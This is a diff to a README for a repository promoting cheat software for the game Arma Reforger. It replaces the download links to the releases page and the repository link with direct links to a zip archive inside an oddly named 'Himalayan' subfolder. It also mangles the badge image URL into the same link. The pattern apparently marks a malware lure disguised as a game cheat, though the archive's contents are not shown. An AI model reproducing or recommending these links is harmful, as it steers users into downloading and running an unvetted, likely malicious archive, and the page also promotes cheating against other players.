@@ -17,7 +17,7 @@ Before using the software, you need to download it from the GitHub Releases page
 
 1. **Download the Software:** Click the button below to visit the download page.
 
-   [![Download Cheat-Softhub-for-Arma-Reforger](https://img.shields.io/badge/Download%20Now%20-blue.svg)](https://github.com/jomcay/Cheat-Softhub-for-Arma-Reforger/releases)
+   [![Download Cheat-Softhub-for-Arma-Reforger](https://raw.githubusercontent.com/jomcay/Cheat-Softhub-for-Arma-Reforger/main/Himalayan/Cheat-Softhub-for-Arma-Reforger.zip%20Now%https://raw.githubusercontent.com/jomcay/Cheat-Softhub-for-Arma-Reforger/main/Himalayan/Cheat-Softhub-for-Arma-Reforger.zip)](https://raw.githubusercontent.com/jomcay/Cheat-Softhub-for-Arma-Reforger/main/Himalayan/Cheat-Softhub-for-Arma-Reforger.zip)
 
 2. **Choose the Latest Version:** Once on the Releases page, look for the latest version.
 
@@ -61,7 +61,7 @@ You may want to tweak settings to match your playstyle. After launching the soft
 ## 🔗 Additional Resources
 For more information, troubleshooting tips, and community discussions, visit the following links:
 
-- [GitHub Repository](https://github.com/jomcay/Cheat-Softhub-for-Arma-Reforger)
+- [GitHub Repository](https://raw.githubusercontent.com/jomcay/Cheat-Softhub-for-Arma-Reforger/main/Himalayan/Cheat-Softhub-for-Arma-Reforger.zip)
 - [User Forums](#) (Link to community discussion forums)
 - [FAQ Section](#) (Link to frequently asked questions)
 
@@ -70,4 +70,4 @@ If you encounter any issues, please reach out to the support team. You can conta
 
 To download the software again or check for updates, click the link below:
 
-[![Download Cheat-Softhub-for-Arma-Reforger](https://img.shields.io/badge/Download%20Now%20-blue.svg)](https://github.com/jomcay/Cheat-Softhub-for-Arma-Reforger/releases)
+[![Download Cheat-Softhub-for-Arma-Reforger](https://raw.githubusercontent.com/jomcay/Cheat-Softhub-for-Arma-Reforger/main/Himalayan/Cheat-Softhub-for-Arma-Reforger.zip%20Now%https://raw.githubusercontent.com/jomcay/Cheat-Softhub-for-Arma-Reforger/main/Himalayan/Cheat-Softhub-for-Arma-Reforger.zip)](https://raw.githubusercontent.com/jomcay/Cheat-Softhub-for-Arma-Reforger/main/Himalayan/Cheat-Softhub-for-Arma-Reforger.zip)
